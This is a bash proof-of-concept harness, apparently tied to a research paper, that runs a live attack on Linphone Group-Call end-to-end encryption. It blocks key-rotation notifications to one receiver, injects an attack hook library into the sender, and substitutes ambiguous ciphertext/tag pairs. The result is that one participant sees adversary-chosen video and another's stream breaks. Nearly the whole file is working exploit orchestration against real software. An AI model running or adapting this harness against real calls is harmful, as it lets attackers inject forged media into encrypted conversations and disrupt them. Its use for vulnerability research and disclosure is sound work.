#!/usr/bin/env bash
# Primary attack harness — Paper §5.4 attack live demo on a real Linphone
# Group-Call E2EE conference. ARMED mode: the hook replaces sender's outgoing
# inner-encrypted bytes with ambiguous (ciphertext, tag) pairs that
# authenticate under both K_old (receiver A's key, frozen by EKT_NOTIFY blocking)
# and K_new (receiver B's key, after the conference-driven rotation).
#
# Expected (paper §5.4 headline effect):
#   T+0..20s   normal Linphone Group-Call E2EE behaviour, receiver A + receiver B
#              both see sender's looped local video file (the
#              video_02_anonymous.mp4 source).
#   T+20s     focus rotates the EKT, the arm-file blocks receiver A's NOTIFY.
#              sender's send-side inner master key flips → hook captures
#              (K_old, K_new) → attack window OPEN.
#   T+20s+    The hook starts substituting every inner srtp_protect output.
#              On the wire each video packet authenticates under both keys.
#              receiver A's libsrtp accepts the tag with K_old and recovers the
#              ADVERSARY video (video_01_main_1920x1440.h265 — note the
#              flowers content), at the SAME inner-encryption layer that
#              previously delivered sender's frame.
#              receiver B's libsrtp accepts the SAME tag with K_new but the
#              recovered bytes are pseudo-random, the H.265 decoder
#              rejects them and the screen freezes / breaks.
#
# Caveat: this run does NOT filter audio/video by SSRC, so receiver A's audio
# stream will also be corrupted (it shares the inner srtp_t with video).
# That's fine for the headline demo; an SSRC-filter pass is the next iter.

set -euo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${POC_DIR}"
# shellcheck disable=SC1091
source "${POC_DIR}/scripts/common.sh"

HOOK_DYLIB="${POC_DIR}/attack/hook/libattack_hook.dylib"
HOOK_VIDEO="${POC_DIR}/src-video/video_01_idr_only.h265"
ARM_FILE=/tmp/poc_blocklist_arm.flag

if [[ ! -f "${HOOK_DYLIB}" ]]; then
    echo "[-] hook dylib missing — run 'make' in attack/hook/ first" >&2
    exit 1
fi
if [[ ! -f "${HOOK_VIDEO}" ]]; then
    echo "[-] adversary video missing: ${HOOK_VIDEO}" >&2
    exit 1
fi

pkill -9 -f "streamer" 2>/dev/null || true
sleep 1
rm -f /tmp/focus.log /tmp/sender.log build/focus.uri "${ARM_FILE}"

# shellcheck disable=SC1091
source build/envrc

EKT_NOTIFY_BLOCKLIST="${SIP_RECV_A_USER}" \
EKT_NOTIFY_BLOCKLIST_ARM_FILE="${ARM_FILE}" \
python -m streamer.focus \
    --sip-uri "${SIP_FOCUS_URI}" \
    --sip-password-file .sip-password-focus \
    --codec h265 \
    --log-level INFO > /tmp/focus.log 2>&1 &
disown

until grep -q "focus is ready" /tmp/focus.log 2>/dev/null; do sleep 1; done
echo "[+] focus ready (codec=h265): $(cat build/focus.uri)"

echo "[+] launching sender with libattack_hook.dylib (ARMED — paper §5.4 attack live)"
echo "    hook video : ${HOOK_VIDEO}"
echo "    arm mode   : ON (real substitution will fire after T+20 s rotation)"

DYLD_INSERT_LIBRARIES="${HOOK_DYLIB}" \
ATTACK_HOOK_VIDEO="${HOOK_VIDEO}" \
ATTACK_HOOK_ARM=1 \
python -m streamer \
    --create --security-level e2ee \
    --codec h265 \
    --video-file src-video/video_02_anonymous.mp4 \
    --sip-uri "${SIP_SENDER_URI}" \
    --sip-password-file .sip-password \
    --conference-factory-uri-file build/focus.uri \
    --lime-server https://lime.linphone.org/lime-server/lime-server.php \
    --invite "${SIP_RECV_A_URI}" \
    --invite "${SIP_RECV_B_URI}" \
    --rotate-after 20 \
    --rotate-arm-file "${ARM_FILE}" \
    --log-level INFO > /tmp/sender.log 2>&1 &
disown

cat <<EOF

=========================================================================
  Primary attack — Paper §5.4 attack LIVE DEMO (H.265, ARMED)
=========================================================================

  Answer the call on receiver A (Android) AND receiver B (iPhone).

  Watch closely at T+20 s:
   - receiver A (Android): SHOULD CONTINUE to show video, but the content
                      should SWITCH from the original video_02_anonymous.mp4
                      loop to the ADVERSARY video
                      (video_01_main_1920x1440.h265 — recognise it by
                      the source content). This is the paper §5.4
                      headline effect: ambiguous tag, K_old decryption.
   - receiver B (iPhone) : video should FREEZE / BREAK at T+20 s (K_new
                      decryption yields random bytes the H.265 decoder
                      rejects).

  Run for ~50 s total, then:
      pkill -9 -f streamer

  Live tail of attack events:
      tail -F /tmp/sender.log | grep --line-buffered \\
          -E 'attack-hook|adversary-nals|ERROR|fatal'

  After stopping:
      echo -n 'observer.protect[ATTACK] : '; grep -c 'observer.protect\\[ATTACK\\]' /tmp/sender.log
      echo -n 'observer.protect[observe]: '; grep -c 'observer.protect\\[observe\\]' /tmp/sender.log
      echo -n 'attack window OPEN       : '; grep -c 'attack window OPEN' /tmp/sender.log

=========================================================================
EOF
